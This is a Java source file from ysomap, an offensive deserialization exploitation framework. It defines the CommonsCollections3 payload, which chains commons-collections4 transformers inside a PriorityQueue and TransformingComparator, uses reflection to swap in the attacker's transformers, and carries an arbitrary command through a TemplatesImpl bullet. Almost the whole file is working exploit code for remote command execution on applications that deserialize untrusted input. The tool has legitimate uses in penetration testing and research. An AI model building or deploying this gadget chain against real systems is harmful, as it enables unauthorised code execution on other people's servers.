package ysomap.core.payload.java.collections;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bullet.collections.TransformerWithTemplatesImplBullet;
import ysomap.core.util.ReflectionHelper;

import java.util.PriorityQueue;
import java.util.Queue;

/**
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Payloads
@Authors({ Authors.FROHOFF })
@Require(bullets = {"TransformerBullet","TransformerWithJNDIBullet","TransformerWithTemplatesImplBullet","TransformerWithResponseBullet"}, param = false)
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
public class CommonsCollections3 extends CommonsCollections2 {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof Transformer[];
    }

    @Override
    public Queue<Object> pack(Object obj) throws Exception {
        Transformer transformerChain = new ChainedTransformer(
                new ConstantTransformer(1));

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformerChain));
        queue.add(1);
        queue.add(1);
        ReflectionHelper.setFieldValue(transformerChain, "iTransformers", obj);
        return queue;
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        Bullet bullet = new TransformerWithTemplatesImplBullet();
        bullet.set("args", command);
        bullet.set("version","4");
        return bullet;
    }
}
